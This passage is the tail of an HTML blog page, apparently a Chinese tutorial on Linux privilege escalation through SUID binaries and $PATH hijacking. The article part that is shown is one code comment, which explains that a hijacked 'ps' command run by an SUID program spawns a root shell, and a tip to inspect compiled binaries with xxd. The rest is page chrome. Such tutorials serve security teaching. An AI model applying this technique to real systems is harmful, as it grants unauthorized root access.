class="comment">#执行shell文件，触发我们劫持的ps命令（此时sysyem运行的ps这个命令是root权限），但是此时实际执行的是  /bin/sh   ，也就是相当于以root权限去执行/bin/sh从而实现提权</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>使用xxd&#x2F;运行(利用报错信息)查看shell参数</strong>: 我们会遇到一种情况是给定的shell文件是已经编译好的文件，此时可以使用xxd来获取参数<code>xxd /shell</code></p>
+</li>
+</ol>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Ref"><span class="toc-number">1.</span> <span class="toc-text">*Ref</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E6%9D%83%E9%99%90%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">2.</span> <span class="toc-text">Linux权限基本概念</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E4%B8%8E%E7%94%A8%E6%88%B7%E7%BB%84"><span class="toc-number">2.1.</span> <span class="toc-text">用户与用户组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E6%9D%83%E9%99%90%E7%BB%A7%E6%89%BF"><span class="toc-number">2.2.</span> <span class="toc-text">进程权限继承</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#suid%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">suid提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#suid-ref"><span class="toc-number">3.1.</span> <span class="toc-text">*suid ref</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFsuid"><span class="toc-number">3.2.</span> <span class="toc-text">什么是suid?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#suid%E6%8F%90%E6%9D%83%E5%AE%9E%E6%88%98%E6%B3%A8%E6%84%8F%E7%82%B9"><span class="toc-number">3.3.</span> <span class="toc-text">suid提权实战注意点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#suid%E6%8F%90%E6%9D%83%E5%AE%9E%E6%88%98"><span class="toc-number">3.4.</span> <span class="toc-text">*suid提权实战</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">环境变量提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fref"><span class="toc-number">4.1.</span> <span class="toc-text">*环境变量ref</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">4.2.</span> <span class="toc-text">什么是环境变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PATH%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="toc-number">4.3.</span> <span class="toc-text">$PATH的作用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86%E4%B8%8E%E5%A4%A7%E5%A4%A7%E5%A4%A7%E5%89%8D%E6%8F%90"><span class="toc-number">4.4.</span> <span class="toc-text">利用原理与大大大前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PATH%E5%AE%9E%E6%88%98"><span class="toc-number">4.5.</span> <span class="toc-text">*$PATH实战</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kc1zs4.github.io/2024/11/04/Linux%E6%8F%90%E6%9D%83/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kc1zs4.github.io/2024/11/04/Linux%E6%8F%90%E6%9D%83/&text=Linux提权"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kc1zs4.github.io/2024/11/04/Linux%E6%8F%90%E6%9D%83/&title=Linux提权"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kc1zs4.github.io/2024/11/04/Linux%E6%8F%90%E6%9D%83/&is_video=false&description=Linux提权"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Linux提权&body=Check out this article: https://kc1zs4.github.io/2024/11/04/Linux%E6%8F%90%E6%9D%83/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kc1zs4.github.io/2024/11/04/Linux%E6%8F%90%E6%9D%83/&title=Linux提权"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kc1zs4.github.io/2024/11/04/Linux%E6%8F%90%E6%9D%83/&title=Linux提权"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kc1zs4.github.io/2024/11/04/Linux%E6%8F%90%E6%9D%83/&title=Linux提权"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kc1zs4.github.io/2024/11/04/Linux%E6%8F%90%E6%9D%83/&title=Linux提权"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kc1zs4.github.io/2024/11/04/Linux%E6%8F%90%E6%9D%83/&name=Linux提权&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kc1zs4.github.io/2024/11/04/Linux%E6%8F%90%E6%9D%83/&t=Linux提权"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2024
+    KC1zs4&#39;s Blog
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+  
+<script src="/js/search.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+
+    var $inputArea = $("input#search-input");
+    var $resultArea = document.querySelector("div#search-result");
+
+    $inputArea.focus(function() {
+      var search_path = "search.xml";
+      if (search_path.length == 0) {
+        search_path = "search.xml";
+      }
+      var path = "/" + search_path;
+      searchFunc(path, 'search-input', 'search-result');
+    });
+
+    $inputArea.keydown(function(e) {
+      if (e.which == 13) {
+        e.preventDefault();
+      }
+    });
+
+    var observer = new MutationObserver(function(mutationsList, observer) {
+      if (mutationsList.length == 1) {
+        if (mutationsList[0].addedNodes.length) {
+          $(".search-no-result").hide();
+        } else if (mutationsList[0].removedNodes.length) {
+          $(".search-no-result").show(200);
+        }
+      }
+    });
+
+    observer.observe($resultArea, { childList: true });
+
+  });
+  </script>
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
